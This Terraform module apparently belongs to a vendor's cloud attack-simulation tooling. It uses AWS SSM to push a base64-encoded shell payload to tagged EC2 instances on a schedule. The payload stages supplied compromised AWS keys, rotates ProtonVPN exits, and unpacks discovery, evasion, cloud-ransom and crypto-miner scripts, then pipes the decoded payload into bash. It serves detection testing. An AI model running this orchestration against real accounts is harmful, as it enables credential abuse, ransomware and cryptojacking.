locals {
    attack_dir = "/cloud-tunnel"
    script = "discovery.sh"
    script_type = "scoutsuite"
    attack_type = "compromised_keys"
    aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    set -e
    LOCKFILE="/tmp/composite.lock"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
    cd ${local.attack_dir}
    ${local.aws_creds}
    echo '${base64encode(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
    echo '${base64encode(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
    echo '${base64encode(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
    echo '${base64encode(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
    echo '${base64encode(local.protonvpn-paid)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-paid
    echo '${base64encode(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
    echo '${base64encode(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
    echo '${base64encode(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
    echo '${base64encode(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
    echo '${base64encode(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
    echo '${base64encode(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
    echo '${base64encode(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/terraform.sh
    echo '${base64encode(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
    echo '${base64encode(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/terraform.sh
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "Starting as background job..."
    if [ "${var.protonvpn_tier}" == "0" ]; then
        for i in $(echo "US NL-FREE#1 JP-FREE#3 NL-FREE#4 NL-FREE#8 US-FREE#5 NL-FREE#9 NL-FREE#12 NL-FREE#13 NL-FREE#14 NL-FREE#15 NL-FREE#16 US-FREE#13 US-FREE#32 US-FREE#33 US-FREE#34 NL-FREE#39 NL-FREE#52 NL-FREE#57 NL-FREE#87 NL-FREE#133 NL-FREE#136 NL-FREE#148 US-FREE#52 US-FREE#53 US-FREE#54 US-FREE#51 NL-FREE#163 NL-FREE#164 US-FREE#58 US-FREE#57 US-FREE#56 US-FREE#55"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
        bash auto-free.sh&  >> $LOGFILE 2>&1
    else
        for i in $(echo "AU CR IS JP LV NL NZ SG SK US"); do cp .env-protonvpn-paid .env-protonvpn-paid-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-paid-$i; done
        bash auto-paid.sh&  >> $LOGFILE 2>&1
    fi;
    log "Done.
    EOT
    base64_payload = base64encode(local.payload)

    protonvpn       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                    protonvpn_privatekey = try(length(var.protonvpn_privatekey), "false") != "false" ? var.protonvpn_privatekey : ""
                                }
                            )
    protonvpn-paid       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = 2
                                    protonvpn_protocol = var.protonvpn_protocol
                                    protonvpn_privatekey = try(length(var.protonvpn_privatekey), "false") != "false" ? var.protonvpn_privatekey : ""
                                }
                            )
    protonvpn-baseline  = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = "US"
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                    protonvpn_privatekey = try(length(var.protonvpn_privatekey), "false") != "false" ? var.protonvpn_privatekey : ""
                                }
                            )
    auto-free   = templatefile(
                                "${path.module}/resources/auto-free.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                    attack_delay = var.attack_delay
                                }
                            )
    auto-paid   = templatefile(
                                "${path.module}/resources/auto-paid.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                    attack_delay = var.attack_delay
                                }
                            )
    baseline    = templatefile(
                                "${path.module}/resources/baseline.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    discovery   = templatefile(
                                "${path.module}/resources/discovery.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    evasion     = templatefile(
                                "${path.module}/resources/evasion.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudransom = templatefile(
                                "${path.module}/resources/cloudransom.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudcrypto = templatefile(
                                "${path.module}/resources/cloudcrypto.tf.tpl",
                                {
                                    name = "crypto-gpu-miner-${var.environment}-${var.deployment}"
                                    instances = 12
                                    wallet = var.ethermine_wallet
                                    region = var.region
                                }
                            )
    hostcrypto  = templatefile(
                                "${path.module}/resources/hostcrypto.tf.tpl",
                                {
                                    name = "host-cpu-miner-${var.environment}-${var.deployment}"
                                    region = var.region
                                    instances = 1
                                    minergate_user = var.minergate_user
                                    nicehash_user = var.nicehash_user
                                }
                            )
    
    terraform  = templatefile(
                                "${path.module}/resources/terraform.sh.tpl",
                                {
                                }
                            )

    start       = templatefile(
                                "${path.module}/resources/start.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
}

###########################
# SSM 
###########################

resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

resource "aws_ssm_document" "this" {
  name          = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "attack simulation",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "${var.timeout}",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "this" {
    name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    resource_query {
        query = jsonencode({
                    ResourceTypeFilters = [
                        "AWS::EC2::Instance"
                    ]

                    TagFilters = [
                        {
                            Key = "${var.tag}"
                            Values = [
                                "true"
                            ]
                        },
                        {
                            Key = "deployment"
                            Values = [
                                var.deployment
                            ]
                        },
                        {
                            Key = "environment"
                            Values = [
                                var.environment
                            ]
                        }
                    ]
                })
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "this" {
    association_name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    name = aws_ssm_document.this.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.this.name,
        ]
    }

    compliance_severity = "HIGH"

    # cronjob
    schedule_expression = "${var.cron}"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}